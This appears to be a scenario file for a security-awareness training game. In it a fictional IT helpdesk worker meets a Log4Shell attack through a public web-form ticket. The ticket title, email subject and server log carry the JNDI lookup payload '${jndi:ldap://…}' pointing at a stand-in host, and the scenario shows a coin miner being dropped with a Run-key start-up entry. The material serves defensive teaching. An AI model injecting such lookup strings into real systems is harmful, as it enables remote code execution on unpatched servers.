# Log4Shell (December 2021). One line of text in a web form made a Java server fetch and run an attacker's program.
# A quest (QUESTS.md): the trainee works the IT helpdesk, closes one ticket safely, then meets Log4Shell in the next one.
# No single real victim is recorded for this scene: the company, the helpdesk portal and the person are invented.
os windows
user Dana Okafor
about
  | Log4Shell (CVE-2021-44228) was a flaw in Log4j, a logging library built into thousands of Java programs: web portals, game servers, security tools. If the program wrote a piece of text containing ${jndi:ldap://…} to its log, Log4j treated it as an instruction, asked the address inside to answer, and ran what came back.
  | Within hours of the news in December 2021, attackers were typing that text into anything that reached a log: chat messages, user names, web form titles, email subjects. Most victims saw nothing at all. Many were later found to be mining coins for the attacker.
  | This scene is an invention: a small company's helpdesk portal that sat unpatched. The portal is fictional.
story
  | You are Dana Okafor, IT support at Northwind Traders. Staff report problems through HelpPoint, the company's helpdesk portal. It is a Java program that runs on the old office PC under your desk.
  | It is mid-morning. You have closed 5 of today's 8 tickets. Three to go.
  | Your HelpPoint sign-in is in a text file on the desktop. A to-do note there says the portal's update was put off to January.
quota 5 8 Tickets closed today

# The portal runs all day on this PC (what a normal Task Manager shows).
run javaw.exe
  cpu 6
  mem 1400
  parent services.exe
  command javaw.exe -Xmx2G -jar C:\HelpPoint\helppoint-portal.jar

# Dana's desk.
file Desktop/helppoint-login.txt
  at 930 200
  | HelpPoint admin
  | User: dana.okafor
  | Password: Helpdesk-2026!
file Desktop/patching-plan.txt
  at 930 300
  | IT to-do (training copy)
  | - Update HelpPoint's Java libraries (Log4j 2.14.1 -> newer): postponed to January
  | - Replace the toner in room 3

# The portal: a sign-in page and the ticket pages behind it.
page portal-login helppoint.northwind.example/admin/sign-in
  title HelpPoint: sign in
  brand HelpPoint
  favorite
  heading Sign in to HelpPoint
  | Staff helpdesk. Sign in to work your tickets.
  field User = dana.okafor
  field secret Password = Helpdesk-2026!
  button Sign in
page solved-4301 helppoint.northwind.example/admin/tickets/4301/solved
  title Ticket 4301 solved
  brand HelpPoint
  heading Ticket 4301 solved
  | The room 2 screen is working again. Marcus Lee has been told.
page ticket-4301 helppoint.northwind.example/admin/tickets/4301
  title Ticket 4301
  brand HelpPoint
  requires portal-login
  heading Ticket 4301
  | A staff ticket is waiting for you.
  section Ticket
  row Title = Room 2 screen will not connect
  row From = Marcus Lee (staff)
  row Sent through = Staff form
  row Note = The cable was loose. Fixed on site.
  button Mark solved -> solved-4301

mail notice-4301
  from HelpPoint <helppoint@northwind.example>
  subject New ticket 4301: Room 2 screen will not connect
  link ticket-4301
  | A new ticket was created in HelpPoint.
  |
  | Title: Room 2 screen will not connect
  | From: Marcus Lee (staff)
  |
  | Open it in HelpPoint to work on it.

step Ticket 6 of 8
  look Mail: HelpPoint's message about a new ticket
  | A new ticket has come in. This one is ordinary: close it the normal way, so you know what normal looks like.
notify mail HelpPoint
  | New ticket 4301: Room 2 screen will not connect

step The link goes to HelpPoint
  look the title in the subject, and the link under the message
  when mail notice-4301
  move Click the link in the email.
  | The title is a plain sentence from a colleague, and the link goes to the portal at helppoint.northwind.example.
open notice-4301

step Sign in as usual
  look the two boxes: User and Password
  when visit ticket-4301
  move Copy the details from helppoint-login.txt on the desktop: click a box and press any keys to type, then click “Sign in”.
  | The portal asks you to sign in first. Remember what this page and this ticket look like.
open ticket-4301

step Check, then close
  look the ticket: title, sender and note
  when choose portal-login 1
  | You are in. The title is a sentence from a colleague, and the note says what was done.
signin portal-login

step 6 of 8 done
  look the counter in the guide: two tickets left
  when choose ticket-4301 any
  move Open the new email from HelpPoint in Mail.
  | Done. Two tickets to go. And another new ticket has just arrived.
choose ticket-4301 1
quota +1

# The lure: a ticket whose title is a lookup instruction. Its one button closes it as spam; the server log is one click on from there.
page helppoint-log helppoint.northwind.example/admin/server-log
  title HelpPoint: server log
  brand HelpPoint
  requires portal-login
  heading Server log
  | What the portal wrote to its log today.
  section Earlier today
  code [08:41:12 INFO] Ticket 4301 created: Room 2 screen will not connect
  code [09:02:44 INFO] Ticket 4301 marked solved by dana.okafor
  section Ticket 4302, just now
  code [09:05:09 INFO] Ticket 4302 created from the public form
  code [09:05:09 INFO] Title: ${jndi:ldap://203.0.113.9:1389/a}
  code [09:05:10 INFO] javaw.exe connected to 203.0.113.9:1389 (LDAP)
  code [09:05:11 INFO] javaw.exe downloaded a class from 203.0.113.9:8080
  code [09:05:12 INFO] javaw.exe started a program called javaupdsvc.exe
  note Training copy: the last three lines are what the computer recorded about the portal's Java process. Nothing is fetched.
page solved-4302 helppoint.northwind.example/admin/tickets/4302/closed
  title Ticket 4302 closed
  brand HelpPoint
  heading Ticket 4302 closed as spam
  | The public form ticket is closed.
  button Open the server log -> helppoint-log
page ticket-4302 helppoint.northwind.example/admin/tickets/4302
  title Ticket 4302
  brand HelpPoint
  requires portal-login
  heading Ticket 4302
  | A new ticket from the public web form.
  section Ticket 4302
  row Title = ${jndi:ldap://203.0.113.9:1389/a}
  row From = guest@visitor-mail.invalid
  row Sent through = Public web form
  row Message = hi my printer is broken pls help
  button Close as spam -> solved-4302
mail notice-4302
  from HelpPoint <helppoint@northwind.example>
  subject New ticket 4302: ${jndi:ldap://203.0.113.9:1389/a}
  link ticket-4302
  | A new ticket was created in HelpPoint.
  |
  | Title: ${jndi:ldap://203.0.113.9:1389/a}
  | From: guest@visitor-mail.invalid
  |
  | Open it in HelpPoint to work on it.
notify mail HelpPoint
  | New ticket 4302: ${jndi:ldap://203.0.113.9:1389/a}

step A ticket with a strange title
  look the subject line: it is not a sentence
  when mail notice-4302
  move Click the link in the email.
  | This title is not words: it starts with ${jndi:, an instruction Log4j follows. It came from the public web form, not a colleague.
open notice-4302

step The portal has already read it
  look the ticket's title, and where it came from
  when visit ticket-4302
  move Read the title, then click “Close as spam”.
  | The portal logged the title the moment the form was sent; opening the ticket changes nothing.
open ticket-4302

step Closed as spam
  look the counter in the guide: seven of eight
  when choose ticket-4302 1
  | Seven of eight. Closing a ticket does not undo what the portal already did with its title.
choose ticket-4302 1
quota +1

step What the log shows
  look the “Ticket 4302, just now” lines in the log
  when choose solved-4302 1
  move Look at what is running: click the “program running” chip under this card.
  | The portal connected to 203.0.113.9 for an answer, then downloaded and started a program from it. That program now runs on this PC and has added a start-up entry.
choose solved-4302 1

# What the attacker's code does: a miner with a disguised name, started by the portal's Java process, with a Run entry.
program dropper-miner javaupdsvc.exe
  publisher none
  signed no
  description Background service
  process javaupdsvc.exe
  cpu 92
  mem 210
  parent javaw.exe
  command C:\Users\Public\javaupdsvc.exe
page solved-4303 helppoint.northwind.example/admin/tickets/4303/solved
  title Ticket 4303 solved
  brand HelpPoint
  heading Ticket 4303 solved
  | Priya Shah has been told. The portal is still slow.
page ticket-4303 helppoint.northwind.example/admin/tickets/4303
  title Ticket 4303
  brand HelpPoint
  requires portal-login
  heading Ticket 4303
  | A staff ticket is waiting for you. This page took 41 seconds to load.
  section Ticket
  row Title = Portal is crawling
  row From = Priya Shah (staff)
  row Sent through = Staff form
  row Message = Nothing opens. My printer ticket is stuck.
  section Server status
  row Server load = 96%
  row Page time = 41 seconds
  row Memory in use = 1.6 GB
  button Mark solved -> solved-4303
mail notice-4303
  from HelpPoint <helppoint@northwind.example>
  subject New ticket 4303: Portal is crawling
  link ticket-4303
  | A new ticket was created in HelpPoint.
  |
  | Title: Portal is crawling
  | From: Priya Shah (staff)
  |
  | Open it in HelpPoint to work on it.
notify mail HelpPoint
  | New ticket 4303: Portal is crawling
launch dropper-miner
startup HelpPointUpdater C:\Users\Public\javaupdsvc.exe
  location HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

step Task Manager shows it
  look the process list: javaupdsvc.exe at 92%, under javaw.exe
  when open taskmanager
  move Open the new email from HelpPoint, then click the link in it.
  | javaw.exe is the portal itself and sits at about 6%: that is normal. javaupdsvc.exe is new, started by the portal, and uses 92% of the processor.
  | It also added a start-up entry, so it returns after a restart. And a new ticket says the portal is crawling.
open taskmanager

step The last ticket, slowly
  look the “Server status” section: 96% load, 41 seconds a page
  when visit ticket-4303
  move Read the whole page, including the server status. Then press “Mark solved”.
  | The ticket is ordinary. The server under it is not: it is busy with something nobody asked it to do.
open ticket-4303

step 8 of 8, or so Dana thinks
  look the counter: the shift is done
  when choose ticket-4303 any
  | All eight tickets are closed. Press Next to see what Log4Shell did.
choose ticket-4303 1
quota +1

step What Log4Shell did
  look the animation: the portal's processor working for the attacker
  | The flaw needed no click and no password: one line of text in a form was enough. Here it mined coins on Dana's PC; others installed ransomware or stole data.
attack botnet-ddos
  | ${jndi:ldap://...} in a ticket title
  | the portal fetched a program from outside
  | the program mines coins on Dana's PC
  | the coins go to the attacker's pool
block 203.0.113.9 3333

flag hard mail notice-4302
  | The subject is a lookup instruction, not a sentence: it came from a visitor's ticket.
flag hard section ticket-4302 1
  | The ticket's title is ${jndi:ldap://…}: text that Log4j reads as an instruction.
flag hard section helppoint-log 2
  | The portal's server connected to an outside address and downloaded a program from it. An ordinary ticket never does that.
flag hard process javaupdsvc.exe
  | A program started by the portal's Java process, using almost all of the processor.
flag hard startup HelpPointUpdater
  | A Run entry that starts the program again after every restart.
flag hard section ticket-4303 2
  | The server is at 96% load and each page takes 41 seconds: something else is using it.
flag hard notice taskmanager connection blocked
  | The program tried to reach an outside address on its own: a miner calling its pool.
flag soft file Desktop/patching-plan.txt
  | A security update put off to January: this is why the portal still ran the flawed library. Patch first.
flag soft file Desktop/helppoint-login.txt
  | A password in a text file on the desktop: any program that runs can read it.

lesson
  | Keep the programs you run up to date, including the libraries inside them. Ask each vendor whether it uses Log4j, and patch first.
  | Text typed by outsiders (forms, chat, user names, subjects) must never be treated as instructions. A title that starts with ${jndi: is an attack, whether or not anyone opens it.
  | Servers should not reach unknown addresses: a blocked outbound connection stops the second half of this attack. A sudden slow server with a busy Java process is worth a look.
